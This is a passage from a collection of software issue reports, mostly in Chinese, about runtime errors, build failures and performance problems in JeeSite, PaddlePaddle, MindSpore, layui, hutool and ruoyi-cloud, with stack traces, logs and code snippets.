class path resource [com/jeesite/modules/config/DataSourceConfig.class]: Invocation of init method failed; nested exception is java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1628) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1138) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1066) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:835) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:741) ... 66 more Caused by: java.lang.UnsatisfiedLinkError: Native Library /home/ubuntu/.sigarlib/libsigar-amd64-linux.so already loaded in another classloader at java.base/java.lang.ClassLoader$NativeLibrary.loadLibrary(ClassLoader.java:2450) at java.base/java.lang.ClassLoader.loadLibrary0(ClassLoader.java:2678) at java.base/java.lang.ClassLoader.loadLibrary(ClassLoader.java:2611) at java.base/java.lang.Runtime.load0(Runtime.java:814) at java.base/java.lang.System.load(System.java:1838) at com.jeesite.common.s.s.i.&lt;clinit&gt;(lm:75) at com.jeesite.common.s.p.i.&lt;clinit&gt;(qb:93) at com.jeesite.common.datasource.g.ALLATORIxDEMO(bl:165) at com.jeesite.common.datasource.g.d(bl:92) at com.jeesite.common.datasource.RoutingDataSource.afterPropertiesSet(bl:43) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1687) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1624) ... 77 more 13-Jul-2018 16:38:44.236 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.core.StandardContext.reload Reloading Context with name [] is completed ========= Enabled refresh mybatis mapper =========
训练过程中实际参与测试的样本量与 配置中指定的测试样本量不相等，且差异较大,"通过test_data_path指定了测试数据，测试样本大概有3000多万； 加载测试数据的日志，显示加载了33622个样本，总共有1000个这样规模的part 但是，问题来了，训练过程中，打出的日志可以看出，参与测试的样本只有1110000个，与指定的测试样本差异巨大；这是什么问题？ 查看workspace目录下test_data_path下的数据，与配置中指定的测试数据一致   <code>: cluster_config( fs_name="""", fs_ugi="""", train_data_path="""", test_data_path="""", output_path="", ) Fri Jun 16 18:48:49 2017[1,28]&lt;stdout&gt;:0 inst loaded Fri Jun 16 18:48:49 2017[1,43]&lt;stdout&gt;:33622 all data loaded I0616 19:02:43.990978 28735 Tester.cpp:111] Test samples=1110000 cost=0.460042 Eval: classification_error_15min=0.0386514 positive_label=0 precision=0.974028 recall=0.992194 F1-score=0.983027 positive_label=1 precision=0.566085 recall=0.324633 F1-score=0.412633 positive_label=2 precision=0.653608 recall=0.544981 F1-score=0.594372 classification_error_30min=0.0415784 positive_label=0 precision=0.971718 recall=0.991218 F1-score=0.981371 positive_label=1 precision=0.538024 recall=0.308805 F1-score=0.392392 positive_label=2 precision=0.605387 recall=0.454104 F1-score=0.518945 classification_error_45min=0.0431766 positive_label=0 precision=0.971818 recall=0.989658 F1-score=0.980657 positive_label=1 precision=0.510215 recall=0.329872 F1-score=0.400686 positive_label=2 precision=0.586656 recall=0.41121 F1-score=0.483509 classification_error_60min=0.0428378 positive_label=0 precision=0.97073 recall=0.990619 F1-score=0.980574 positive_label=1 precision=0.529627 recall=0.300821 F1-score=0.383704 positive_label=2 precision=0.579775 recall=0.427326 F1-score=0.492012 I0616 19:02:43.991206 28735 GradientMachine.cpp:112] Saving parameters to ./output/pass-00000-001 I0616 19:02:43.996541 28735 Util.cpp:213] copy conf/trainer_config.conf to ./output/pass-00000-001"
关于输入框输入html的标签提交后丢失标签的问题,你好，大大： 1、创建一个表，根据表生成input输入框 2、输入“” 3、通过框架的序列化后提交 4、结果：在后台拦截的时候丢失了标签。前后的标签都没了。 我找了很久也没找到预处理，不知道是哪里出了问题或者被处理掉了？   <code>: &lt;label&gt;test&lt;/label&gt; &lt;label&gt;
关于execute方法的日志打印问题，建议一下,"执行代码： 打印日志： 建议你考虑一下   <code>: SQLReady sqlReady = new SQLReady(""select * from user where age &gt; ? and age &lt; ?"", 40, 45); List&lt;User&gt; userList = sqlManager.execute(sqlReady, User.class);"
如何获得table中当前的排序字段,"版本：layui 2.8 描述：在使用服务端排序后，再进行搜索的时候，如何将排序字段和内容带到服务端 表格的可用排序 {title: '字典ID', field: 'dict_id', align:'center', width:100,sort: true}, {title: '字典排序', field: 'sort', align:'center',sort: true}, 比如手动排序后，比如 ： 默认是采用 sort desc，手动点击，采用了 dict_id asc排序 如何在form.on 中获取 dict-table 的排序字段和内容   <code>: table.on('sort(dict-table)', function(obj){ let where= form.val('search'); where.field= obj.field; where.order= obj.type; table.reload('dict-table', { initSort: obj ,where: where }); }); form.on('submit(dict-query)', function(data){ //如何获得表格的排序规则 table.reload('dict-table',{where:data.field}) return false; });"
[CT][MS]pynative ms_function runtime error,"在原有用例上加ms_function后 pynative模式下报错 cpu和gpu后端 MindSporeTest/heterogeneous_execution test_heterogeneous_mixedprecision_controlflow_basic.py / 硬件环境: /device GPU/CPU/ : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative 1.执行用例 2. 3. 正常运行   <code>: 开头两个网络加ms_function class ControlFlowNet(Cell): ' Net definition ' def __init__(self, in_channel, out_channel, x): super().__init__() self.bias = Parameter(Tensor(np.ones([3]).astype(np.float32)), name='bias1') self.biasAdd1 = P.BiasAdd() self.biasAdd2 = P.BiasAdd() self.relu = ReLU() self.addn = P.AddN() self.equal = P.Equal() self.bn = BatchNorm2d(num_features=in_channel) self.Depend = P.Depend() self.mean = P.ReduceMean(keep_dims=False) self.conv = Conv2d(in_channels=in_channel, out_channels=in_channel, kernel_size=1, stride=1, has_bias=False, weight_init='ones', pad_mode='same') self.fc1 = Dense(in_channels=in_channel, out_channels=out_channel, weight_init='ones', bias_init='zeros', has_bias=True) self.fc2 = Dense(in_channels=in_channel, out_channels=out_channel, weight_init='ones', bias_init='zeros', has_bias=True) self.x = x @ms_function def construct(self, inputs): out = self.biasAdd1(inputs, self.bias) y = (self.x - 10) z = y m = z while (self.x &gt; z): out = self.biasAdd2(out, self.bias) if (self.x &gt; z): out = self.addn((inputs, out)) while (self.x &gt; m): out = self.conv(out) m = (m + 1) if (z &gt; 5): out = self.addn((out, out, out)) m = 8 while (m &gt; 10): out = self.addn((out, out, out)) m = (m + 1) else: out = self.biasAdd2(out, self.bias) out_bn = self.bn(out) out_conv = self.conv(out) self.Depend(out_bn, out_conv) out = self.addn((out_bn, out_conv)) while (self.x &gt; y): out = self.addn((inputs, out)) y = (y + 1) z = (z + 1) out = self.addn((out, out)) out = self.mean(out, (2, 3)) out = self.fc1(out) return out class SwitchLayerNet(Cell, MetaFactory): def __init__(self, in_channel, out_channel): super().__init__() MetaFactory.__init__(self) self.relu = ReLU() self.relu6 = ReLU() self.conv = Conv2d(in_channels=in_channel, out_channels=out_channel, kernel_size=1, stride=1, has_bias=False, weight_init='ones', pad_mode='same') self.mean = P.ReduceMean(keep_dims=False) self.fc1 = Dense(in_channels=out_channel, out_channels=out_channel, weight_init='ones', bias_init='zeros', has_bias=True) self.fc2 = Dense(in_channels=out_channel, out_channels=out_channel, weight_init='ones', bias_init='zeros', has_bias=False) self.i = Parameter(Tensor(0, ms.int32), name='index', requires_grad=False) self.funcs = (self.fc1, self.fc2) @ms_function def construct(self, x): x = self.relu(x) x = self.conv(x) x = self.mean(x, (2, 3)) x = self.funcs[self.i](x) return x class HeterogeneousControlFlowTrainFactory(MetaFactory): def __init__(self, level='O0', loss_scale_manager=None, export_flag=False): super().__init__() self.epoch_size = 2 self.batch_size = 32 self.num_classes = 12 self.data_path = (os.path.split(os.path.abspath(__file__))[0] + '/rank_ckpt/') self.export_flag = export_flag self.dtype = 'FP32' self.lr = 0.0001 self.momentum = 0.9 self.ckpt_path = ('checkpoint_lenet-%s_%s.ckpt' % (self.epoch_size, float(self.batch_size))) self.level = level self.loss_scale_manager = loss_scale_manager self.opt_flag = 'Momentum' self.ds_eval = create_animal_dataset(epoch_size=1, label_dtype=self.dtype) if (not os.path.isdir(os.path.dirname(self.data_path))): os.makedirs(os.path.dirname(self.data_path)) def controlflow_mixedpredprecision_basic_impl(self, inputs): net = ControlFlowNet(3, 12, 10) out = self._model_train(net, inputs) return out def heterogeneous_controlflow_mixedpredprecision_impl(self, inputs): net = ControlFlowNet(3, 12, 10) net.equal.add_prim_attr('primitive_target', 'CPU') net.addn.add_prim_attr('primitive_target', 'CPU') net.biasAdd2.add_prim_attr('primitive_target', 'CPU') out = self._model_train(net, inputs) return out def swithlayernet_mixedpredprecision_basic_impl(self, inputs): net = SwitchLayerNet(3, 12) out = self._model_train(net, inputs) return out def heterogeneous_swithlayernet_mixedpredprecision_impl(self, inputs): net = SwitchLayerNet(3, 12) net.mean.add_prim_attr('primitive_target', 'CPU') net.fc1.matmul.add_prim_attr('primitive_target', 'CPU') out = self._model_train(net, inputs) return out def _model_train(self, net, inputs): net_opt = Momentum(learning_rate=0.0001, momentum=0.9, params=net.trainable_params()) model = Model(network=net, eval_network=None, loss_fn=SoftmaxCrossEntropyWithLogits(sparse=False, reduction='mean'), optimizer=net_opt, metrics={'Accuracy': Accuracy()}, amp_level=self.level, loss_scale_manager=self.loss_scale_manager) ckpt_config = CheckpointConfig(keep_checkpoint_max=1) ckpt_path = './rank_{}_ckpt'.format(self.global_rank_id) ckpt_callback = ModelCheckpoint(prefix='parallel', directory=ckpt_path, config=ckpt_config) clean_all_ckpt_files(ckpt_path) model.train(epoch=self.epoch_size, train_dataset=deepcopy(self.ds_eval), callbacks=[ckpt_callback], dataset_sink_mode=False) find_newest_ckpt_file(ckpt_path) model.eval(deepcopy(self.ds_eval), dataset_sink_mode=False) out = model.predict(inputs) if self.export_flag: if (ms.context.get_context('device_target') == 'Ascend'): export(net, inputs, file_name=(self.data_path + 'resnet50_train.pb'), file_format='AIR') export(net, inputs, file_name=(self.data_path + 'resnet50_train.bin'), file_format='MINDIR') return out def test_heter_mixed_controlflow_train_swithlayer_o0(): inputs = Tensor(np.ones([32, 3, 32, 32]).astype(np.float32)) fact = HeterogeneousControlFlowTrainFactory(level='O0', loss_scale_manager=None) out_device = fact.swithlayernet_mixedpredprecision_basic_impl(inputs) out_heter = fact.heterogeneous_swithlayernet_mixedpredprecision_impl(inputs) allclose_nparray(out_device.asnumpy(), out_heter.asnumpy(), 0.0009, 9e-05) &gt; out_device = fact.swithlayernet_mixedpredprecision_basic_impl(inputs) test_heterogeneous_mixedprecision_controlflow_basic_1020.py:239: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ test_heterogeneous_mixedprecision_controlflow_basic_1020.py:150: in swithlayernet_mixedpredprecision_basic_impl out = self._model_train(net, inputs) test_heterogeneous_mixedprecision_controlflow_basic_1020.py:167: in _model_train model.train(epoch=self.epoch_size, train_dataset=deepcopy(self.ds_eval), callbacks=[ckpt_callback], dataset_sink_mode=False) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/train/model.py:1062: in train initial_epoch=initial_epoch) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/train/model.py:98: in wrapper func(self, *args, **kwargs) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/train/model.py:617: in _train self._train_process(epoch, train_dataset, list_callback, cb_params, initial_epoch, valid_infos) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/train/model.py:914: in _train_process outputs = self._train_network(*next_element) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:644: in __call__ raise err /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:640: in __call__ output = self._run_construct(args, kwargs) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:418: in _run_construct output = self.construct(*cast_inputs, **kwargs) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:379: in construct loss = self.network(*inputs) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:644: in __call__ raise err /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:640: in __call__ output = self._run_construct(args, kwargs) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:418: in _run_construct output = self.construct(*cast_inputs, **kwargs) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:116: in construct out = self._backbone(data) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:644: in __call__ raise err /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:640: in __call__ output = self._run_construct(args, kwargs) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:418: in _run_construct output = self.construct(*cast_inputs, **kwargs) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/common/api.py:566: in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj, jit_config)(*args) /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/common/api.py:96: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._MindsporeFunctionExecutor object at 0x7f14ff7b7390&gt; args = (SwitchLayerNet&lt; (relu): ReLU&lt;&gt; (relu6): ReLU&lt;&gt; (conv): Conv2d&lt;input_channels=3, output_channels=12, kernel_size...-01], [ 7.21568644e-01, 6.94117665e-01, 6.54901981e-01 ... 2.86274523e-01, 3.49019617e-01, 3.68627459e-01]]]])) args_list = (Tensor(shape=[32, 3, 224, 224], dtype=Float32, value= [[[[ 3.92156899e-01, 4.03921604e-01, 3.92156899e-01 ... 6.23...01], [ 7.21568644e-01, 6.94117665e-01, 6.54901981e-01 ... 2.86274523e-01, 3.49019617e-01, 3.68627459e-01]]]]),) phase = 'MindSporeTest.heterogeneous_execution.test_heterogeneous_mixedprecision_controlflow_basic_1020.construct./root/minico...3.7/lib/python3.7/site-packages/mindspore/common/api.py.553.139728188933904.grad.1666682992435698944.139728187792272.0' new_inputs = [Tensor(shape=[32, 3, 224, 224], dtype=Float32, value= [[[[ 3.92156899e-01, 4.03921604e-01, 3.92156899e-01 ... 6.23...-01], [ 7.21568644e-01, 6.94117665e-01, 6.54901981e-01 ... 2.86274523e-01, 3.49019617e-01, 3.68627459e-01]]]])] @_wrap_func def __call__(self, *args): args_list = args if self.obj is not None: args_list = args_list[1:] phase = '' with _MsFunctionCompileContext(): phase = self.compile(args_list, self.fn.__name__) if context.get_context(""precompile_only""): return None new_inputs = self._generate_run_args(args_list) &gt; output = self._graph_executor(tuple(new_inputs), phase) E RuntimeError: Failure info [Null abstract of node: @35_1_construct.Default_wrapper.15:16{[0]: ValueNode&lt;Primitive&gt; switch_layer, [1]: 17, [2]: 18}]. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/runtime/graph_scheduler/control_node_parser.cc:1900 GetFuncGraphs /root/miniconda3/envs/zxci3.7/lib/python3.7/site-packages/mindspore/common/api.py:378: RuntimeError"
Docker启动ruoyi-modules-system失败,"本人使用ruoyi-cloud提供的docker命令启动项目，发现启动ruoyi-modules-system前，MySQL、redis、nacos、nginx、auth、gateway均正常运行，启动ruoyi-modules-system后，报错 接着nacos也down了   <code>: Server check fail, please check server 192.168.81.129 ,port 9848 is available , error ={}"
poi读取时多个相同列名,"JDK版本： openjdk_8_201 hutool版本： 5.6.5 excel读取时，多个列名相同如何映射到bean的不同属性   <code>: reader.addHeaderAlias(""合并单元格"", ""属性1""); reader.addHeaderAlias(""合并单元格"", ""属性2"");"
[编译错误] cmake版本为3.12和3.17，PaddlePaddle源码编译报nvcc错误,"标题：Linux编译错误 1）PaddlePaddle版本：8603b5fb722692bfee148ddf30ee9c3a7d39a5e1 2）CPU：MKL/OpenBlas/MKLDNN/ 都是使用默认编译选项 3）GPU：V100，CUDA Version 9.0.176 4）系统环境：Ubuntu 16.04.4 LTS, Python2.7 复现信息： 1）cmake命令： 2) cmake为3.10版本，编译正常。cmake为3.12和3.17版本，编译中报nvcc错误，如下 。 内部汇报case，可以联系 juncai   <code>: cmake .. -DWITH_GPU=ON -DWITH_TESTING=ON -DCMAKE_BUILD_TYPE=Release -DPY_VERSION=2.7 nvcc fatal : redefinition of argument 'std'"
关于set方法return this；在更新日志里报Method not found： setXXX的问题处理反馈,"由于第一次用mybatis-plus且里面有一个功能就是自动生成代码的set方法带return this; 比如代码： 而这样就导致了在更新的方法里使用 @BussinessLog(value = ""修改系统变量"", key = ""varId"", dict = Dict.VariableDict) 会直接导致报错，异常信息是：Method not found： setXXX之类的信息 今大半天的检查发现 Contrast.contrastObj方法中大概是第82和83行 PropertyDescriptor pd = new PropertyDescriptor(field.getName(), clazz); Method getMethod = pd.getReadMethod(); 这个方法引起的，原因是这个类会自动生成简单最普通的set和get方法，但是由于我们这里的set方法并不普通。导致这个类认为没有这个方法 解决办法如下 注释第82行和83行代码 修改为，下面针对Boolean的单独做了处理，是因为mybatis-plus对于boolean的字段会生成isXX()的set方法。 同时针对其他的方法做了处理，如果没有改方法就打印log。 现在完美解决，继续跑   <code>: public SysVariable setVarPid(Long varPid) { this.varPid = varPid; return this; } String prefix = ""get""; if(field.getType().getName().equals(""java.lang.Boolean"")){ prefix = ""is""; } Method getMethod = null; try{ getMethod = clazz.getDeclaredMethod(prefix + StrKit.firstCharToUpperCase(field.getName())); }catch(java.lang.NoSuchMethodException e){ System.err.println(""this className:"" + clazz.getName() + "" is not methodName: "" + e.getMessage()); continue; }"
【众智】【计算-AICPU接入】SparseReduceSumSparse,"AICPU算子接入 SparseTensor版的ReduceSum, 返回SparseTensor。 接口目录：mindspore/ops/operations/sparse_ops.py x_indices x_values x_shape reduction_axes y_indices y_values y_shape keep_dims bool 属性 对应底层算子 对应底层AI CPU算子SparseReduceSumSparse 标杆接口参考 TF接口： tf.raw_ops.SparseReduceSumSparse https://www.tensorflow.org/api_docs/python/tf/raw_ops/SparseReduceSumSparse 3. 异常处理 4. 算子反向 无需接入反向算子   <code>: class SparseReduceSumSparse(Primitive):"
Current distributed train performance is low with large batch size.,Tested with case at https://github.com/PaddlePaddle/Paddle/pull/7539 pserver count: 10 trainer count: 20 batch_size: 256 ps: with batch_size=128 the performance is very close to paddle v2.   <code>: -------------------------&gt; Profiling Report &lt;------------------------- Place: CPU Time unit: ms Sorted by total time in descending order in the same thread Event Calls Total Min. Max. Ave. thread0::conv2d_grad 2548 1.84323e+06 10.6373 1208.43 723.401 thread0::send 196 1.03645e+06 1929.13 33046.7 5287.99 thread0::conv2d 2548 805943 16.981 645.093 316.304 thread0::relu_grad 2744 121372 0.379077 169.115 44.2317 thread0::dropout 1960 105289 0.70104 271.5 53.7188 thread0::elementwise_add_grad 3136 52334 0.017612 94.454 16.6881 thread0::batch_norm_grad 2744 49512 1.61373 88.4812 18.0437 thread0::pool2d_grad 980 39721.5 1.23894 130.015 40.5322 thread0::batch_norm 2744 30616.2 1.40684 51.2201 11.1575 thread0::concat 2940 21679.4 0.033544 28.4918 7.37394 thread0::split 2940 21668.6 0.036486 21.0824 7.37026 thread0::elementwise_add 3136 19276.1 0.010466 49.919 6.14672 thread0::relu 2744 15351.8 0.061462 40.1993 5.59466 thread0::dropout_grad 1960 13100.2 0.072866 53.4363 6.68379 thread0::pool2d 980 12333.2 0.562252 40.5884 12.5849 thread0::fill_zeros_like 12936 6485.17 0.004164 33.1582 0.501328 thread0::mul_grad 588 1932.03 0.129321 6.57921 3.28576 thread0::mul 588 1016.71 0.053803 3.49156 1.7291 thread0::feed 392 154.4 0.008685 1.99152 0.393877 thread0::softmax 196 56.0639 0.106532 0.348264 0.286041 thread0::top_k 196 29.6402 0.056678 0.596919 0.151226 thread0::softmax_grad 196 25.5922 0.048661 0.159772 0.130572
Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encountered,"Hello, while I train my models, this error sometimes occurred. It is very weird that by training the same samples, the error sometimes occurred, but sometimes didn't. I wanna know why this error occur and how to avoid this error to train my models successfully. Here is the log: wish your reply, thank you.   <code>: I1104 11:18:44.281013 87409 TrainerInternal.cpp:165] Batch=3000 samples=192000 AvgCost=0.136428 CurrentCost=0.100355 Eval: classification_error_evaluator=0.0541406 CurrentEval: classification_error_evaluator=0.0395312 I1104 11:18:45.290464 87409 Tester.cpp:127] Test samples=1000 cost=0.347865 Eval: classification_error_evaluator=0.148 ................................................................................................... I1104 11:19:09.124543 87409 TrainerInternal.cpp:165] Batch=3100 samples=198400 AvgCost=0.135145 CurrentCost=0.0966748 Eval: classification_error_evaluator=0.0535938 CurrentEval: classification_error_evaluator=0.0371875 ..........F1104 11:19:11.596421 87418 hl_cuda_cublas.cc:220] Check failed: stat == CUBLAS_STATUS_SUCCESS (13 vs. 0) [cublas status]: execution failed *** Check failure stack trace: *** F1104 11:19:11.596427 87426 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encounteredF1104 11:19:11.596457 87427 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encounteredF1104 11:19:11.596423 87430 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encounteredF1104 11:19:11.596422 87422 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encountered *** Check failure stack trace: *** F1104 11:19:11.596427 87426 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encounteredF1104 11:19:11.596457 87427 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encounteredF1104 11:19:11.596423 87430 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encounteredF1104 11:19:11.596422 87422 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encountered *** Check failure stack trace: *** F1104 11:19:11.596427 87426 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encounteredF1104 11:19:11.596457 87427 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encounteredF1104 11:19:11.596423 87430 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encounteredF1104 11:19:11.596422 87422 hl_cuda_device.cc:661] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encountered *** Check failure stack trace: *** /usr/local/paddle/bin//paddle: line 81: 87409 Aborted (core dumped) ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2}"
[ST][MS][NET][bert-thor][910 8p]FPS[508] can not reach 533,"bert-thor网络在910环境8p训练，性能508/fps达不到533 / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:c915f9ed -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220901 MindSpore 版本：编译时间20220904181546 r1.9.0 commit_id:c915f9ed (/): /mode graph test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative.py cd solution_test/cases/02network/02nlp/bert_thor/pynative pytest -s test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative.py 网络训练成功，性能能达到533/fps 走给王程浩   <code>: Train epoch time: 660963.017 ms, per step time: 6609.630 ms Train epoch time: 30439.204 ms, per step time: 304.392 ms Train epoch time: 30437.414 ms, per step time: 304.374 ms Train epoch time: 30433.884 ms, per step time: 304.339 ms Train epoch time: 30436.731 ms, per step time: 304.367 ms Train epoch time: 30432.632 ms, per step time: 304.326 ms Train epoch time: 30430.238 ms, per step time: 304.302 ms Train epoch time: 30443.725 ms, per step time: 304.437 ms Train epoch time: 30441.177 ms, per step time: 304.412 ms Train epoch time: 30446.898 ms, per step time: 304.469 ms Train epoch time: 30446.240 ms, per step time: 304.462 ms Train epoch time: 30435.798 ms, per step time: 304.358 ms Train epoch time: 30455.194 ms, per step time: 304.552 ms Train epoch time: 30450.477 ms, per step time: 304.505 ms Train epoch time: 30441.422 ms, per step time: 304.414 ms Train epoch time: 30432.277 ms, per step time: 304.323 ms Train epoch time: 30435.053 ms, per step time: 304.351 ms Train epoch time: 30445.599 ms, per step time: 304.456 ms Train epoch time: 30438.532 ms, per step time: 304.385 ms Train epoch time: 30434.880 ms, per step time: 304.349 ms Train epoch time: 30423.789 ms, per step time: 304.238 ms Train epoch time: 30437.855 ms, per step time: 304.379 ms Train epoch time: 30422.086 ms, per step time: 304.221 ms Train epoch time: 30424.923 ms, per step time: 304.249 ms Train epoch time: 54530.325 ms, per step time: 545.303 ms"
SummaryCollector is not working,: /device gpu /device cpu /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : The SummaryCollector is not working. The error message is output_dataset has not attribute   <code>: input
language model fail,"commit 155ebbb9dc1d0c00d1fb8030cf23870c8460ef59 会导致language_model fail. 环境如下： Tesla P40 CUDA8 CUDNN7 gcc version 4.8.3 Python 2.7.3   <code>: paddle.fluid.core.EnforceNotMet: invalid resource handle at [/home/users/***/workspace/Paddle/paddle/fluid/platform/device_context.cc:231] PaddlePaddle Call Stacks: 0 0x7efec3702876p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 486 1 0x7efec47a643ap paddle::platform::CUDADeviceContext::Wait() const + 474 2 0x7efec46f0ea1p paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 977 3 0x7efec46ed74cp paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) + 252 4 0x7efec46193b7p 5 0x7efec46368c0p 6 0x7efec4636135p paddle::framework::details::OpHandleBase::RunAndRecordEvent(std::function&lt;void ()&gt; const&amp;) + 805 7 0x7efec4618e8fp paddle::framework::details::ComputationOpHandle::RunImpl() + 95 8 0x7efec46371c5p paddle::framework::details::OpHandleBase::Run(bool) + 117 9 0x7efec45e69cap 10 0x7efec37d1b73p std::_Function_handler&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; (), std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, void&gt; &gt;::_M_invoke(std::_Any_data const&amp;) + 35 11 0x7efec37d1427p std::__future_base::_State_base::_M_do_set(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;&amp;, bool&amp;) + 39 12 0x7efeece02be0p pthread_once + 80 13 0x7efec45e59a2p 14 